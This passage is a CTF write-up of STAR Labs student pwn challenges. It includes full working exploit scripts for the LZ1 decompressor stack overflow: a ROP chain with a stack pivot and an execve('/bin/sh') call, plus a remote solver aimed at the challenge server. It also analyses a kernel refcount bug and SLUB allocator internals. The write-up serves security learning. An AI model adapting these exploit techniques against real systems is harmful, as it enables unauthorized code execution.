@@ -1,0 +1,2113 @@
+---
+title: "STAR Labs Summer Pwnables 2025"
+date: 2025-09-09
+excerpt: STAR Labs Summer Pwnables 2025 - LZ1, Temporal Paradox and Zero Day
+category: writeups
+tags:
+  - pwn
+  - kernel
+  - wasm
+---
+
+import Challenge from "@components/Challenge.vue";
+
+A few weeks ago, STAR Labs released a set of 3 challenges for Singapore students
+to try and solve. I was the 2nd person to solve all 3 challenges, and received
+\$256 + \$100, and a copy of "From Day Zero to Zero Day" by Eugene. Thanks to
+STAR Labs for organizing this mini-CTF!
+
+# Challenge #001
+
+<Challenge
+  title="LZ1"
+  flag="STAR{now_time_to_recreate_blastpass_8d59ba9898}"
+  solves={7}
+  files={[{name: "lz1.zip", url: "https://github.com/star-sg/challenges/raw/refs/heads/main/Aug%202025/lz1.zip"}]}>
+
+Your objective, should you dare to accept: Transform from zero to hero by
+achieving the ultimate prize – Gain Code Execution Access! But here’s the catch:
+Imagine you’ve found a bug in the linux gzip tool… One that can potentially
+trigger a reverse shell if a malicious payload is passed Your job is to craft
+that payload… be very subtle 🥷 One wrong move and… 💀
+
+</Challenge>
+
+("Let me know if you'd like more emojis with that!" ahh desc)
+
+We are presented with a program that implements some kind of compression
+algorithm. On the remote, we can choose to upload a file to compress or
+decompress. Most likely, our vulnerability will be in the decompression step, as
+we are taking input that's smaller and making it bigger. Let's look at the
+compression algorithm in detail first to understand how we can encode our
+payload.
+
+## Overview of the compress algorithm
+
+The algorithm works by compressing repeated strings of data. It stores a certain
+pattern of characters as `ddllcc`, taking up 3 bytes in total. The program, at a
+certain point in the uncompressed string, will look behind up to `2 **
+pointer_length` number of characters. It will attempt to get the longest
+possible repeated pattern within this range. The offset from the current pointer
+to the pattern is saved as `dd`, and the desired length of the repeated pattern
+is saved as `ll`. If `ll` is greater than `dd`, then the pattern is repeated
+until the number of bytes `ll` is reached. Lastly, the literal byte `cc` is
+appended at the end of the pattern. This process is repeated for the entire
+uncompressed string.
+
+The above algorithm is for the case `pointer_length == 8{:c}`. However, it can
+range from 0 to 15, and that shifts the number of bits reserved for each
+parameter respectively. So when `pointer_length == 0{:c}`, the maximum length of
+pattern is `(2 ** 0) - 1 == 0x0{:c}`, and the maximum lookbehind distance is `(2
+** 16) - 1 == 0xffff{:c}`. Since the longest possible pattern is 0 characters,
+the 3-byte struct will always only include 2 null bytes followed by the literal
+byte itself. When `pointer_length == 15{:c}`, the maximum pattern length is `(2
+** 15) - 1 == 0x7fff{:c}`, and maximum lookbehind distance is `(2 ** 0x1) - 1 ==
+0x1{:c}`. Since we can only look behind 1 byte, we can repeat sequences of 1
+byte up to 0x7fff times.
+
+We can play with `pointer_length` values in-between to produce varying degrees
+of success with the compression, depending on what kind of data we're
+compressing.
+
+## Implementation of the decompress algorithm
+
+Now that we understand the compression algorithm, we can look for
+vulnerabilities in the decompression algorithm.
+
+For the specific decompression algorithm in the challenge, we can see that the
+buffers for the compressed and uncompressed data are both allocated on the stack
+using `alloca`. For the uncompressed data, the size of the buffer is indicated
+by the first 4 bytes of the file, and the pointer width is stored in the 5th
+byte of the file. 
+
+The current index that the algorithm is inserting characters into is
+represented by `coding_pos`. Let's look at the algorithm here:
+
+```c
+uint32_t lz77_decompress (uint8_t *compressed_text, uint8_t *uncompressed_text)
+{
+    uint8_t pointer_length_width;
+    uint16_t input_pointer, pointer_length, pointer_pos, pointer_length_mask;
+    uint32_t compressed_pointer, coding_pos, pointer_offset, uncompressed_size;
+
+    uncompressed_size = *((uint32_t *) compressed_text);
+    pointer_length_width = *(compressed_text + 4);
+    compressed_pointer = 5;
+
+    pointer_length_mask = pow(2, pointer_length_width) - 1;
+
+    for(coding_pos = 0; coding_pos < uncompressed_size; ++coding_pos)
+    {
+        input_pointer = *((uint16_t *) (compressed_text + compressed_pointer));
+        compressed_pointer += 2;
+        pointer_pos = input_pointer >> pointer_length_width;
+        pointer_length = pointer_pos ? ((input_pointer & pointer_length_mask) + 1) : 0;
+        if(pointer_pos)
+            for(pointer_offset = coding_pos - pointer_pos; pointer_length > 0; --pointer_length)
+                uncompressed_text[coding_pos++] = uncompressed_text[pointer_offset++];
+        *(uncompressed_text + coding_pos) = *(compressed_text + compressed_pointer++);
+    }
+
+    return coding_pos;
+}
+```
+
+We can see that `coding_pos` is only checked every time we parse a new 3-byte
+structure. However, that is not the only place `coding_pos` is incremented, as
+it is also incremented when we are repeating sequences of characters in the
+nested for loop. Thus, we can create an oob write here and overflow the stack.
+
+Honestly, because I'm too lazy to actually think about how the stack is laid out
+when we `alloca` the buffers, I just used gdb to try different combinations of
+`pointer_length` and uncompressed file sizes to try and create an overflow, and
+maximize the number of bytes we have in our overflow. In the end, I managed to
+get a decently-sized overflow with `pointer_length = 0x9`, and by varying the
+length of the rop chain managed to maximize the overflow to 11 qwords, although
+the return address is positioned at payload+0x10, so our total length of rop
+chain is actually only 9 qwords. With this overflow, we now need to construct a
+small enough chain that can set the registers to the proper values and call the
+execve syscall.
+
+## ROP chaining
+
+Initially, I didn't consider stack pivoting as I thought I could do the syscall
+in 1 stage. Also, the remote setup unintentionally allowed us to access stdin;
+the intended solution was to invoke a reverse shell to simulate a user actually
+running the program on the crafted lz1 file. So I just wanted to place the
+/bin/sh string somewhere in bss region, and make the execve syscall. We didn't
+have a proper rdx gadget but I noticed that rdx was already set to a stack
+pointer to null, which is a valid envp pointer for execve so we don't need to
+control it. With the following gadget chain, I actually managed to do all of the
+above:
+
+```asm
+; 0x0000000000402777
+pop rax ; 59
+ret ; 
+
+; 0x000000000040266b
+pop rcx ; /bin/sh
+ret ;
+
+; 0x00000000004042d8
+pop rdi ; 0x4b1000
+pop rbp ; 0x10
+ret ;
+
+; 0x000000000045b9a6
+mov qword ptr [rdi], rcx ;
+ret ;
+
+; 0x0000000000432788
+lea rsi, [rbp - 8] ;
+syscall ;
+```
+
+This chain worked on local but not on remote. Later, I found out that the remote
+is using busybox, so it was necessary to set the argv pointer as well. I'm short
+of qwords to write the pointer to /bin/sh in bss region and set rbp to
+binsh_pointer+0x8, so unfortunately this rop chain had to be binned.
+
+Since we don't have enough space for the rop chain, we should consider stack
+pivoting. We can do this with a read syscall instead:
+
+```asm
+; 0x00000000004042d8
+pop rdi ; 0x0
+pop rbp ; 0xdeadbeef
+ret ;
+
+; 0x000000000040d402
+pop rsi ; 0x4b1100
+pop rbp ; 0x4b1100
+ret ;
+
+; 0x0000000000416116
+syscall ;
+ret ;
+
+; 0x0000000000401c69
+leave ;
+ret ;
+```
+
+Here, we only need to control rdi and rsi, since rdx is a very large positive
+value that won't limit our read size. rax is also set to 0 conveniently, so we
+don't need to waste bytes controlling rax as well. This allowed me to get a 1st
+stage rop chain of length 0x8 qwords, and jump to the rop chain using a `leave ;
+ret` gadget. Then, we want to write the following values:
+
+1. "/bin/sh", "-c"
+2. pointers to these 2 strings
+
+We can do this with multiple read calls to make the exploit neater. After this,
+we will get our shell by calling /bin/busybox with argv `/bin/sh -c /bin/sh`.
+
+```
+[*] '/home/samuzora/ctf/practice/starlabs/lz1/lz1'
+    Arch:       amd64-64-little
+    RELRO:      Partial RELRO
+    Stack:      Canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x400000)
+    SHSTK:      Enabled
+    IBT:        Enabled
+    Stripped:   No
+[+] Opening connection to 159.223.33.156 on port 9101: Done
+[*] Switching to interactive mode
+(c)ompress or (d)ecompress: Enter data to decompress base64 encoded: STAR{now_time_to_recreate_blastpass_8d59ba9898}
+
+(Please include this flag when submitting your writeup)
+[*] Got EOF while reading in interactive
+$
+[*] Interrupted
+[*] Closed connection to 159.223.33.156 port 9101
+```
+
+Here are the 2 exploit scripts - `gen_solve.py` to generate the payload file and
+`solve.py` to send the payload file and the payload to be received by read
+syscall.
+
+```py title="gen_solve.py"
+from pwn import *
+
+context.bits = 64
+
+def compress_payload(payload):
+    out = b""
+    for i in payload:
+        out += p16(0x0)
+        out += bytes([i])
+    return out
+
+pointer_length = 0x9
+
+# gadgets
+pop_rax = 0x0000000000402777 
+pop_rdi_rbp = 0x00000000004042d8
+pop_rsi_rbp = 0x000000000040d402
+pop_rdx_leave = 0x00000000004695a3 
+syscall_ret = 0x0000000000416116
+pop_rcx = 0x000000000040266b
+mov_rdi_rcx = 0x000000000045b9a6
+ret = 0x000000000040101a 
+lea_rsi_syscall = 0x0000000000432788
+leave_ret = 0x0000000000401c69
+
+lea_rdx_call_rbx = 0x000000000044d594
+pop_rbx = 0x000000000046da97
+
+# rop = flat(
+#     pop_rax, 59,
+#
+#     pop_rcx, 0x6477702f6e69622f,
+#     pop_rdi_rbp, 0x4b1000, 0x10,
+#     mov_rdi_rcx,
+#
+#     lea_rsi_syscall,
+#
+#     0xdeadbeef,
+#     # rop chain ends here, but we need the last 0xdeadbeef to make sure the loop loops correctly
+#     0xdeadbeef,
+# )
+rop = flat(
+    pop_rdi_rbp, 0x0, 0xdeadbeef,
+    pop_rsi_rbp, 0x4b1100, 0x4b1100,
+    syscall_ret,
+    leave_ret,
+
+    0xdeadbeef,
+    0xdeadbeef,
+    0xdeadbeef,
+)
+# rop = flat(
+#     0x1, 0x2,
+#     0x3, 0x4,
+#     0x5, 0x6, 0x7,
+#     0x8, 0x9,
+#     0xa,
+#     0xb,
+# )
+print(hex(len(rop)))
+
+padding = b"a"*0x18
+
+payload = b""
+payload += p32(len(padding) + len(rop) + 0x8) # uncompressed size
+payload += p8(pointer_length)
+
+# (pointer_pos << pointer_max_width) | (pointer_len - 2)
+
+# payload += compress_payload(padding)
+# payload += p16( (len(padding) << pointer_length) | (0x1000 - 2) )
+# payload += b"A"
+
+padding = compress_payload(padding)
+rop_payload = compress_payload(rop)
+payload += padding
+payload += rop_payload
+payload += p16( (len(rop) << pointer_length) | (0x200 - 1) )
+payload += b"a"
+
+with open("./exploit_c", "wb") as file:
+    file.write(payload)
+```
+
+```py title="solve.py"
+#!/usr/bin/env python3
+
+from pwn import *
+
+exe = ELF("./lz1")
+
+context.binary = exe
+context.aslr = False # rmb to check for brute-forcable stuff!!!
+
+if args.LOCAL:
+    p = process([exe.path, "d", "./exploit_c", "test"])
+    if args.GDB:
+        gdb.attach(p)
+    pause()
+else:
+    p = remote("159.223.33.156", 9101)
+    p.sendline(b"d")
+
+    # encoded.txt is base64-encoded version of exploit_c
+    with open("./encoded.txt", "rb") as file:
+        p.sendline(file.read())
+    sleep(1)
+
+# good luck pwning :)
+
+pop_rax = 0x0000000000402777 
+syscall_ret = 0x0000000000416116
+pop_rdi_rbp = 0x00000000004042d8
+pop_rsi_rbp = 0x000000000040d402
+pop_rdx_r12_rbp = 0x000000000047e364 
+
+payload = flat(
+    0xdeadbeef,
+
+    pop_rax, 0x0,
+    pop_rdi_rbp, 0x0, 0x0,
+    pop_rsi_rbp, 0x4b2000, 0x0,
+    syscall_ret,
+
+    # write arguments
+    pop_rax, 0x0,
+    pop_rdi_rbp, 0x0, 0x0,
+    pop_rsi_rbp, 0x4b2100, 0x0,
+    syscall_ret,
+
+    pop_rax, 0x0,
+    pop_rdi_rbp, 0x0, 0x0,
+    pop_rsi_rbp, 0x4b2f00, 0x0,
+    syscall_ret,
+
+    pop_rdx_r12_rbp, 0x0, 0x0, 0x0,
+    pop_rdi_rbp, 0x4b2000, 0x0,
+    pop_rsi_rbp, 0x4b2f00, 0x0,
+    pop_rax, 59,
+    syscall_ret,
+)
+p.sendline(payload)
+
+sleep(1)
+p.sendline(b"/bin/sh\x00-c\x00")
+
+sleep(1)
+p.sendline(b"/bin/sh\x00")
+
+sleep(1)
+payload = flat(
+    0x4b2000, # /bin/sh
+    0x4b2008, # -c
+    0x4b2100, # /bin/sh
+    0x0,
+)
+p.sendline(payload)
+
+p.interactive()
+```
+
+# Challenge #002 
+
+<Challenge
+  title="Temporal Paradox"
+  solves={3}
+  flag="flag{6854fd87bad65c12a28a1a2fc3fd527b}"
+  files={[{name: "for-participant.zip", url: "https://github.com/star-sg/challenges/raw/refs/heads/main/Aug%202025/for_participant.zip"}]}>
+
+Imagine you've stumbled upon a hidden kernel module on a deep server... a
+mysterious 'Temporal Paradox Engine' that claims to let you manipulate time
+itself.
+
+The researcher insists it's perfectly stable, that its "Local Causality" model
+prevents any paradoxes. But you have a hunch... there's a flaw in its
+fundamental logic that could collapse the entire timeline.
+
+Your job? Craft an exploit that creates a paradox, shatters the engine's
+protections, and gives you ultimate control of the system.
+
+Be subtle though - the kernel is watching... 🥷
+
+</Challenge>
+
+This challenge is a kernel pwn challenge, and I spent a combined total of about
+1 week on this challenge. I gave up and took a break halfway to catch up on some
+of my school assignments, and finally managed to solve it on 30 August, almost 2
+weeks after the challenge was released. This is also the first kernel pwn
+challenge that I've actually solved in a CTF before the author released theirs,
+so I'm quite happy with my solve :)
+
+Let's take a look at the kernel driver.
+
+## Analysis
+
+```c
+struct temporal_event {
+	u64 event_id;
+	refcount_t causal_weight;
+	struct temporal_event *causal_dependency;
+	char description[64];
+	struct list_head timeline_node;
+	struct timeline *parent_timeline;
+};
+
+struct timeline {
+	u64 timeline_id;
+	atomic64_t next_event_id;
+	struct list_head events_head;
+	struct temporal_event *caused_by_event;
+	struct list_head session_node;
+};
+
+struct paradox_session_data {
+	struct mutex lock; 
+	struct list_head all_timelines;
+	atomic64_t next_timeline_id;
+};
+
+static struct kmem_cache *temporal_event_cache;
+
+static void event_erase_from_reality(struct temporal_event *event);
+
+static void event_get(struct temporal_event *event) { if (event) refcount_inc(&event->causal_weight); }
+static void event_put(struct temporal_event *event) { if (event && refcount_dec_and_test(&event->causal_weight)) event_erase_from_reality(event); }
+static void event_erase_from_reality(struct temporal_event *event) {
+	kfree(event);
+}
+```
+
+These are the struct definitions and global variables that we'll be referring to throughout the
+challenge.
+
+```c
+static int dev_init(void) {
+	dev.minor = MISC_DYNAMIC_MINOR;
+	dev.name = DEVICE_NAME;
+	dev.fops = &fops;
+	dev.mode = 0644;
+	temporal_event_cache = kmem_cache_create("temporal_event_cache",
+			sizeof(struct temporal_event),
+			0, SLAB_PANIC, NULL);
+	if (!temporal_event_cache) {
+		printk(KERN_ERR "paradox_engine: Failed to create slab cache.\n");
+		return -ENOMEM;
+	}
+
+	if (misc_register(&dev)) {
+		return -1;
+	}
+
+	return 0;
+}
+```
+
+On loading the module into the system, a special object cache is created for
+`struct temporal_event`, which has a size of 0x70 bytes. This is a really odd
+object size, and we'll explore how we can exploit this weird size later on. This
+is also the first kernel pwn challenge I've seen that creates a cache for its
+own objects, so it's a new opportunity for me to learn and understand the SLUB
+allocator more deeply.
+
+```c
+static int paradox_engine_open(struct inode *inode, struct file *filp) {
+	struct paradox_session_data *session = kzalloc(sizeof(*session), GFP_KERNEL);
+	if (!session) return -ENOMEM;
+
+	mutex_init(&session->lock);
+
+	INIT_LIST_HEAD(&session->all_timelines);
+	atomic64_set(&session->next_timeline_id, 0);
+
+	struct timeline *primordial_tl = kzalloc(sizeof(*primordial_tl), GFP_KERNEL);
+	if (!primordial_tl) { kfree(session); return -ENOMEM; }
+	primordial_tl->timeline_id = atomic64_fetch_add(1, &session->next_timeline_id);
+	atomic64_set(&primordial_tl->next_event_id, 0);
+	INIT_LIST_HEAD(&primordial_tl->events_head);
+	list_add_tail(&primordial_tl->session_node, &session->all_timelines);
+
+	struct temporal_event *first_cause = kmem_cache_alloc(temporal_event_cache, GFP_KERNEL|__GFP_ZERO);
+	if (!first_cause) { kfree(primordial_tl); kfree(session); return -ENOMEM; }
+	first_cause->event_id = atomic64_fetch_add(1, &primordial_tl->next_event_id);
+	refcount_set(&first_cause->causal_weight, 1);
+	strcpy(first_cause->description, "The First Cause");
+	first_cause->parent_timeline = primordial_tl;
+	list_add_tail(&first_cause->timeline_node, &primordial_tl->events_head);
+
+	filp->private_data = session;
+	return 0;
+}
+```
+
+On opening a handle to the module, we allocate the session object that stores a
+reference to the linked list of timelines. Then, we initialize the first
+timeline and first event in the timeline. The pointer to this session is then
+stored in the `private_data` field of the handle that we opened, which is
+actually quite important. This means that multiple instances of handles will
+have their own sessions and not be aware of the other sessions being opened. In
+other words, we can actually open multiple handles to the same module, and have
+them interact independently. This is quite different from usual kernel pwn
+challenges, and is also an important point for later on.
+
+```c
+static long paradox_engine_ioctl(struct file *filp, unsigned int cmd, unsigned long arg) {
+  // ...
+		case PARADOX_CREATE_TIMELINE:
+			{
+				struct paradox_timeline_req req;
+				if (copy_from_user(&req, (void __user *)arg, sizeof(req))) { ret = -EFAULT; break; }
+				struct temporal_event *cause_event = NULL;
+				list_for_each_entry(tmp_tl, &session->all_timelines, session_node) {
+					if(tmp_tl->timeline_id == req.cause_timeline_id) {
+						cause_event = find_event_in_timeline(tmp_tl, req.cause_event_id);
+						if(cause_event) break;
+					}
+				}
+				if (!cause_event) { ret = -EINVAL; break; }
+				struct timeline *new_tl = kzalloc(sizeof(*new_tl), GFP_KERNEL);
+				if (!new_tl) { ret = -ENOMEM; break; }
+				new_tl->timeline_id = atomic64_fetch_add(1, &session->next_timeline_id);
+				atomic64_set(&new_tl->next_event_id, 0);
+				INIT_LIST_HEAD(&new_tl->events_head);
+				new_tl->caused_by_event = cause_event;
+				event_get(cause_event);
+				list_add_tail(&new_tl->session_node, &session->all_timelines);
+				req.new_timeline_id = new_tl->timeline_id;
+				if (copy_to_user((void __user *)arg, &req, sizeof(req))) { ret = -EFAULT; break; }
+				break;
+			}
+  // ...
+}
+```
+
+The first action we can do is create a timeline, which will be added to the
+linked list of timelines. This timeline must have a causal event, so creating a
+timeline will increase the refcount for the parent event. Nothing much here,
+although it will be useful later on.
+
+```c
+static long paradox_engine_ioctl(struct file *filp, unsigned int cmd, unsigned long arg) {
+  // ...
+		case PARADOX_CREATE_EVENT:
+			{
+				struct paradox_event_req req;
+				if (copy_from_user(&req, (void __user *)arg, sizeof(req))) { ret = -EFAULT; break; }
+				list_for_each_entry(tmp_tl, &session->all_timelines, session_node) {
+					if (tmp_tl->timeline_id == req.target_timeline_id) { target_tl = tmp_tl; break; }
+				}
+				if (!target_tl) { ret = -EINVAL; break; }
+				struct temporal_event *event = kmem_cache_alloc(temporal_event_cache, GFP_KERNEL|__GFP_ZERO);
+				if (!event) { ret = -ENOMEM; break; }
+				event->event_id = atomic64_fetch_add(1, &target_tl->next_event_id);
+				refcount_set(&event->causal_weight, 1);
+				strncpy(event->description, req.description, sizeof(event->description) - 1);
+				event->parent_timeline = target_tl;
+				list_add_tail(&event->timeline_node, &target_tl->events_head);
+				if (req.cause_event_id != 0) {
+					struct temporal_event *cause_event = find_event_in_timeline(target_tl, req.cause_event_id);
+					if (cause_event) {
+						event->causal_dependency = cause_event;
+						event_get(cause_event);
+					}
+				}
+				req.new_event_id = event->event_id;
+				if (copy_to_user((void __user *)arg, &req, sizeof(req))) { ret = -EFAULT; break; }
+				break;
+			}
+  // ...
+}
+```
+
+Now we get to the core part of the challenge. In this second action, we can
+create a new event, and this event will be added to the linked list of events
+within a given timeline. The interesting part is that the event can also have a
+causal event, specified by the ID of the event. The causal event must be within
+the same timeline that the new event has been added to. Here, we find our first
+primitive: the event is added to the timeline before the causal event is
+searched and added to the field. This means that it's possible for the new
+event's causal event to be itself, which will ~create a time paradox and tear
+the fabric of space-time~ maybe cause some issues later! Since the event IDs
+increment from 0, it's easy to predict the ID that will be assigned to the new
+event.
+
+These are the only 2 ioctl operations that we can do with the module handle.
+Let's take a look at the last action we can do, which is closing the handle:
+
+```c
+static int paradox_engine_release(struct inode *inode, struct file *filp) {
+	struct paradox_session_data *session = filp->private_data;
+	struct timeline *tl, *tmp_tl;
+	struct temporal_event *event, *tmp_event;
+	list_for_each_entry(tl, &session->all_timelines, session_node) {
+		list_for_each_entry_safe(event, tmp_event, &tl->events_head, timeline_node) {
+			struct temporal_event *cause = event->causal_dependency;
+			list_del(&event->timeline_node);
+			while (cause) {
+				struct temporal_event *next_in_chain = cause->causal_dependency;
+				event_put(cause);
+				cause = next_in_chain;
+			}
+			event->causal_dependency = NULL;
+			event_put(event);
+		}
+	}
+	list_for_each_entry_safe(tl, tmp_tl, &session->all_timelines, session_node) {
+		list_del(&tl->session_node);
+		if (tl->caused_by_event) event_put(tl->caused_by_event);
+		kfree(tl);
+	}
+	kfree(session);
+	return 0;
+}
+```
+
+In here, the linked list of events for each timeline is iterated through. The
+event is first removed from the linked list. Then the refcount of the causal
+event is decremented by 1, and the process iterates through the entire linked
+list of causal events decrementing their refcounts by 1, until there is no more
+causal event in this list. Then, the refcount of the target event is finally
+decremented by 1, and we move on to the next event in the timeline linked list.
+
+After all the events have had their refcounts decremented, some will be freed,
+while others that have timelines attached to them will still be allocated. Each
+timeline is then freed, and the refcount of the causal event is also decremented
+by 1. Once all events and timelines are freed, the session is freed and we've
+successfully closed the module handle.
+
+## "Time Loop"
+
+Now that we've read through the module's source code, let's look at what we can
+do with our primitive. The only other place where the
+`event->causal_dependency{:c}` member is used is in the freeing logic. If an
+event's causal dependency points to itself, then we'll create an infinite loop
+where the event's refcount is repeatedly decremented over and over again. While
+this is a UAF, it's quite limited because it doesn't cause a double free - it's
+only freed once when refcount reaches 0. After refcount becomes negative, the
+`refcount_dec_and_test{:c}` function doesn't error out, but instead enters the
+`refcount_warn_saturate{:c}` function, where the value is set to 0xc0000000. The
+reason as specified in the kernel source is that this value is a negative value
+that is almost equidistant from both 0x7fffffff (largest positive int) and
+0xffffffff (largest negative int). This way, the chances that multiple refcount
+operations, racing on the same unlocked object, can turn the warning value back
+into a valid refcount is extremely low, especially since the PID limit on Linux
+is 0x400000. Hence, this mechanism keeps the object safe from double free by
+invalidating its refcount (and hence by extension preventing any additional free
+operation on the object), while improving the stability of the kernel by not
+issuing a kernel oops or panic.
+
+Anyway, our primitive is now an infinite loop that repeatedly attempts to
+decrease the victim's refcount. What we wanna do now is perform cross-cache on
+the `temporal_event_cache`, and we can do so by simply freeing all the objects
+on the same slab as the victim and letting the page get freed, afterwards
+reclaiming the page from the buddy allocator. Or so I thought...
+
+### CPU troubles
+
+Because of the unique setup of the primitive that we have, the CPU that we
+create the infinite loop on is permanently soft-locked for the kernel. This is
+the first issue that cropped up for me - I initially set the CPU to only CPU0 as
+I always do for kernel pwn challenges, not fully understanding the implications
+of this or why we actually do it, other than a simple understanding that it
+increases the reliability of the exploit. In doing so, I relinquish control of
+CPU0 to the kernel and block myself from using CPU1. Initially, I thought it was
+possible to somehow reclaim control of CPU0 via some fork or pthread tricks eg.
+setting the kernel thread's CPU to CPU1 after it gets stuck on the infinite
+loop, but after trying for really long, I realized it in fact wasn't possible,
+because the busy loop never lets the kernel thread go into the waiting queue.
+"Why did you try so hard to regain control of CPU0?" you might ask. Well, the
+SLUB allocator isn't so simple when we have multiple CPUs. Let's take a small
+detour into the SLUB allocator internals. (if you're already familiar with SLUB
+and buddy allocator and just want the writeup, you can skip over to
+[here](#doing-cross-cache-the-proper-way)!)
+
+### SLUB allocator
+
+As we know, the SLUB allocator, at a high level, claims free pages from the
+buddy allocator and repurposes them as "slabs", and serves object allocation
+requests from these slabs. A slab is a collection of objects that are
+physically and virtually adjacent in memory, and which all belong to the same
+object cache. `struct slab{:c}` stores a reference to its object cache, and a
+freelist of free objects.
+
+The `struct slab{:c}` is stored in the `vmmap_mem{:c}` region, which is an array
+of `struct page{:c}` that keeps track of all physical pages allocated by the
+kernel. Since `struct slab{:c}` overlays `struct page{:c}`, these 2 structures
+are very closely linked; `struct slab{:c}` is just a specific kind of `struct
+page{:c}`. Therefore, the 2 structs will be somewhat interchangeable throughout
+this writeup. 
+
+An object cache is the global object which represents a type (or group of
+types) of object in the kernel. It stores many things such as the object's size,
+name of the object cache, the linked list of cpu caches, maximum number of
+cpu partial slabs, etc. The struct definition for the object cache is `struct
+kmem_cache{:c}`.
+
+Each CPU on the system has a cpu cache which stores a reference to the active
+slab for the CPU and the per-cpu partial list. When `kmalloc{:c}` or
+`kemm_cache_alloc{:c}` and its variants are called on, say, CPU0, the cpu cache
+for CPU0 will be used (which is also the first cpu cache in the object cache's
+linked list).
+
+When we allocate an object, either from `kmalloc` or `kmem_cache_alloc`, we
+eventually reach `slab_alloc_node`. These are the paths taken by `kmalloc` and
+`kmem_cache_alloc` respectively.
+
+```c title="include/linux/slab.h"
+#define kmalloc(...)				alloc_hooks(kmalloc_noprof(__VA_ARGS__))
+
+static __always_inline __alloc_size(1) void *kmalloc_noprof(size_t size, gfp_t flags)
+{
+	if (__builtin_constant_p(size) && size) {
+		unsigned int index;
+
+		if (size > KMALLOC_MAX_CACHE_SIZE)
+			return __kmalloc_large_noprof(size, flags);
+
+		index = kmalloc_index(size);
+		return __kmalloc_cache_noprof(
+				kmalloc_caches[kmalloc_type(flags, _RET_IP_)][index],
+				flags, size);
+	}
+  // ...
+}
+
+// in mm/slub.c
+void *__kmalloc_cache_noprof(struct kmem_cache *s, gfp_t gfpflags, size_t size)
+{
+	void *ret = slab_alloc_node(s, NULL, gfpflags, NUMA_NO_NODE,
+					    _RET_IP_, size);
+
+  // ...
+}
+```
+
+```c title="mm/slub.c"
+static inline void *kmem_cache_alloc(struct kmem_cache *cachep, int flags)
+{
+	return kmem_cache_alloc_lru(cachep, NULL, flags);
+}
+
+#define kmem_cache_alloc_lru(...)	alloc_hooks(kmem_cache_alloc_lru_noprof(__VA_ARGS__))
+
+void *kmem_cache_alloc_lru_noprof(struct kmem_cache *s, struct list_lru *lru,
+			   gfp_t gfpflags)
+{
+	void *ret = slab_alloc_node(s, lru, gfpflags, NUMA_NO_NODE, _RET_IP_,
+				    s->object_size);
+
+  // ...
+}
+```
+
+Now that we're in `slab_alloc_node{:c}`, this is a high-level overview of what
+happens. Each next step is only taken if object allocation fails on the current
+step.
+
+1. Check the per-cpu active slab to see if it has free objects in the freelist.
+   (`slab_alloc_node{:c}`)
+
+2. Check the per-cpu partial list to see if it has any partial slabs.
+   (`___slab_alloc{:c}`, `new_slab` path) Once a partial slab is found, it is set
+   as the active slab, and normal active slab processing follows.
+
+3. Check the node partial list for partial slabs. If a suitable partial slab is
+   found, remove that slab from the node partial list and set it as the active slab.
+   (`get_partial_node{:c}`). Normal active slab processing follows.
+
+4. Allocate a new slab from the buddy allocator and set it as the active slab.
+   (`allocate_slab{:c}`) Normal active slab processing follows.
+
+Why so many layers of caching? The main idea is to reduce lock-taking. In step
+1, the active slab is always locked by default, as access is almost atomic and
+is always on the same cpu, so there is little room for racing here. In step 2,
+the per-cpu partial list lock needs to be taken, because when we're doing more
+complex operations, there is a possibility that the kernel needs to wait for
+something, and then the current cpu is relinquished to other threads, giving
+rise to the possibility of racing. In step 3, in addition to the per-cpu partial
+list lock, the node partial list lock also needs to be taken, as other cpus can
+access the same node partial list.
+
+Freeing is a little more nuanced than allocating.
+
+```c title="mm/slub.c"
+void kfree(const void *object)
+{
+	struct folio *folio;
+	struct slab *slab;
+	struct kmem_cache *s;
+	void *x = (void *)object;
+
+	trace_kfree(_RET_IP_, object);
+
+	if (unlikely(ZERO_OR_NULL_PTR(object)))
+		return;
+
+	folio = virt_to_folio(object);
+	if (unlikely(!folio_test_slab(folio))) {
+		free_large_kmalloc(folio, (void *)object);
+		return;
+	}
+
+	slab = folio_slab(folio);
+	s = slab->slab_cache;
+	slab_free(s, slab, x, _RET_IP_);
+}
+```
+
+The fast path for freeing can be taken if the object to be freed exists on the
+cpu active slab (`do_slab_free{:c}`). If not, the slow path is taken in
+`__slab_free{:c}`.
+
+The lock for the node partial list is taken immediately, because we need to
+access it quite a lot here. The object is inserted to the head of its slab's
+freelist, and the `inuse{:c}` field of the slab is decremented by 1. 
+
+Now we check if `inuse == 0{:c}`, as if it is then it is an empty slab. If the slab
+is also on the node partial list, and we have at least `min_partial{:c}` number of
+slabs on the node partial list, then the slab is released to the buddy
+allocator. If not, nothing happens. The implication of this is that empty slabs
+may exist on per-cpu and node partial, if the conditions are right.
+
+If the slab's freelist was empty before inserting our victim object, then it was
+previously a full slab and is no longer one now. We thus need to add it to the
+per-cpu partial list (`put_cpu_partial{:c}`). If the number of slabs in the per-cpu
+partial list is greater than or equal to `cpu_partial_slabs{:c}` member of the
+object cache, then the per-cpu partial list is full. Add the victim slab to the
+per-cpu partial list first, before moving the entire cpu partial list to the
+node partial list. (`__put_partials{:c}`)
+
+While we're putting slabs into the node partial list, we check each slab to see
+if it's empty and there are more slabs in the node partial list than
+`min_partial{:c}` field of the object cache. If so, we directly free this slab back
+to the buddy allocator.
+
+You might be wondering what the `min_partial{:c}` and `cpu_partial_slabs{:c}`
+members are set to. For `cpu_partial_slabs{:c}`, it is set like this:
+
+```c title="mm/slub.c"
+static void set_cpu_partial(struct kmem_cache *s)
+{
+#ifdef CONFIG_SLUB_CPU_PARTIAL
+	unsigned int nr_objects;
+
+	/*
+	 * cpu_partial determined the maximum number of objects kept in the
+	 * per cpu partial lists of a processor.
+	 *
+	 * Per cpu partial lists mainly contain slabs that just have one
+	 * object freed. If they are used for allocation then they can be
+	 * filled up again with minimal effort. The slab will never hit the
+	 * per node partial lists and therefore no locking will be required.
+	 *
+	 * For backwards compatibility reasons, this is determined as number
+	 * of objects, even though we now limit maximum number of pages, see
+	 * slub_set_cpu_partial()
+	 */
+	if (!kmem_cache_has_cpu_partial(s))
+		nr_objects = 0;
+	else if (s->size >= PAGE_SIZE)
+		nr_objects = 6;
+	else if (s->size >= 1024)
+		nr_objects = 24;
+	else if (s->size >= 256)
+		nr_objects = 52;
+	else
+		nr_objects = 120;
+
+	slub_set_cpu_partial(s, nr_objects);
+#endif
+}
+
+static void slub_set_cpu_partial(struct kmem_cache *s, unsigned int nr_objects)
+{
+	unsigned int nr_slabs;
+
+	s->cpu_partial = nr_objects;
+
+	/*
+	 * We take the number of objects but actually limit the number of
+	 * slabs on the per cpu partial list, in order to limit excessive
